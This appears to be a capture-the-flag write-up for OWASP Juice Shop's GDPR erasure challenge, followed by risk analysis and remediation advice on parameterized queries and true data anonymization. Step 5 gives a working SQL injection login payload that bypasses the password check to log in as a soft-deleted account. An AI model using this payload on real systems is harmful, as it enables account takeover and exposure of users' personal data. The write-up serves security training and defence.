### **Methodology**

1. **Reconnaissance**
   - Identified the challenge as logging in with Chris' erased user account.
   - The challenge name references GDPR's "right to erasure" (Article 17), suggesting the account was deleted but may still exist in the database.

2. **Challenge Key Identification**
   - Queried the challenges API to confirm the objective:
     ```js
     fetch('/api/Challenges/', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     }).then(r => r.json()).then(d => {
       const c = d.data.find(x => x.name === 'GDPR Data Erasure')
       console.log(c.key, c.description)
     })
     // Output: ghostLoginChallenge - Log in with Chris' erased user account.
     ```

3. **Account Enumeration Attempt**
   - Tried to find Chris' account via the Users API — returned `undefined`, confirming the account is filtered from standard API responses due to soft deletion (`deletedAt IS NOT NULL`).

4. **Soft Delete Analysis**
   - Juice Shop uses Sequelize's `paranoid` mode, which sets a `deletedAt` timestamp instead of physically removing records.
   - The account still exists in the database but is excluded from normal queries. The login endpoint, however, does not filter soft-deleted accounts.

5. **SQL Injection Bypass**
   - Crafted a SQL injection payload targeting the login endpoint to authenticate as the soft-deleted user:
     ```js
     fetch('/rest/user/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         email: "' OR deletedAt IS NOT NULL--",
         password: 'anything'
       })
     })
     ```
   - The injected SQL effectively becomes:
     ```sql
     SELECT * FROM Users WHERE email = '' OR deletedAt IS NOT NULL--' AND password = '...'
     ```
   - This returns the first soft-deleted user (Chris), bypassing both the password check and the soft-delete filter.

6. **Validation**
   - Login succeeded with Chris' erased account and the challenge was marked as solved.

7. **Tools Used**
   - **Browser DevTools** (console)
   - **JavaScript `fetch` API** (for crafting the injection request)
   - **SQL Injection** (manual payload construction)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **SQL Injection on login endpoint** (CWE-89) and **Incomplete Data Erasure via soft delete** (CWE-212)

2. **Affected Components**
   - **Login Endpoint** (`POST /rest/user/login`) and **Users Database Table** (Sequelize paranoid soft delete)

3. **Severity Level**
   - **High**
     - The SQL injection allows full authentication bypass, including for accounts that should no longer exist.
     - The soft-delete implementation violates GDPR Article 17 — deleted user data remains intact and accessible in the database.

---
### **Risks**

1. **Business Impact**
   - **Authentication Bypass**: SQL injection allows login as any user, including deleted accounts, without credentials.
   - **GDPR Violation**: Users who exercised their right to erasure still have their data accessible, exposing the organization to fines of up to 4% of annual global turnover.
   - **Data Breach**: An attacker who logs in as a deleted user can access their personal data, order history, and payment information.
   - **Reputational Damage**: Failure to properly implement GDPR erasure, combined with an exploitable login endpoint, represents a critical security and compliance failure.

2. **Exploitation Potential**
   - An attacker with knowledge of the email format can enumerate soft-deleted accounts and authenticate as them via SQL injection.
   - The vulnerability can be chained with other attacks (e.g., data exfiltration) to escalate impact.

---
### **Actions**

#### **Risk Mitigation Strategies**
- Use parameterized queries or a properly configured ORM to prevent SQL injection on all database-facing endpoints.
- Implement true data erasure for GDPR requests — physically delete the record or irreversibly anonymize all personally identifiable information before soft-deleting.
- Ensure the login endpoint explicitly filters out soft-deleted accounts at the query level.

#### **Remediation Fixes**
- Replace raw SQL string interpolation with Sequelize's parameterized query syntax.
- For GDPR erasure, anonymize user data before deletion:
  ```js
  await user.update({
    email: `deleted_${user.id}@deleted.invalid`,
    username: 'Deleted User',
    password: crypto.randomBytes(32).toString('hex')
  })
  await user.destroy()
  ```
- Add `where: { deletedAt: null }` to all authentication queries to ensure soft-deleted accounts cannot be authenticated.

#### **Best Security Practices**
- Never construct SQL queries using string concatenation with user-supplied input — always use parameterized queries or prepared statements.
- GDPR erasure must be irreversible: soft deletion alone is insufficient if the data remains intact and accessible.
- Regularly audit authentication endpoints for injection vulnerabilities as part of security reviews.
- **Reference**: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), [GDPR Article 17 — Right to Erasure](https://gdpr-info.eu/art-17-gdpr/)
